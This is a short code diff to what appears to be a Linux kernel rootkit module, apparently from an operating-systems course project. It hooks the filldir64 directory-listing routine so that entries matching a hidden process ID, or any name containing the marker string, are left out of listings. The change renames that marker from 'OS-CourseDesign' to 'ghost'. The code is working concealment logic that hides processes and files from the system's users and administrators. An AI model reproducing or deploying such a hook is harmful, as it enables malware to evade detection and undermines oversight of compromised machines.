@@ -106,7 +106,7 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
+	if (pid != hidden_pid && !strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
